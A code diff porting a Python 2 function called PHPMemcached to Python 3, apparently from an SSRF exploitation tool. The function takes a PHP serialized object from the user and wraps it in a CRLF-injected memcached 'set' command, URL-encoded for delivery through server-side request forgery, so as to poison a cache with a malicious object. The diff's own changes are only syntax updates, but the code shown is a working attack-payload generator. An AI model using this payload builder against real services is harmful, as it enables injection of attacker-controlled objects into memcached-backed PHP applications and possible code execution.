@@ -1,4 +1,4 @@
-import urllib
+from urllib import parse
 
 
 def PHPMemcached():
@@ -8,7 +8,7 @@ def PHPMemcached():
         + "\033[0m"
     )
 
-    code = raw_input(
+    code = input(
         "\033[96m"
         + 'Give serialization payload\nexample: O:5:"Hello":0:{}   : '
         + "\033[0m"
@@ -21,7 +21,7 @@ def PHPMemcached():
     payload = "%0d%0aset SpyD3r 4 0 " + str(len(code)) + "%0d%0a" + code + "%0d%0a"
 
     finalpayload = (
-        urllib.quote_plus(payload)
+        parse.quote_plus(payload)
         .replace("+", "%20")
         .replace("%2F", "/")
         .replace("%25", "%")
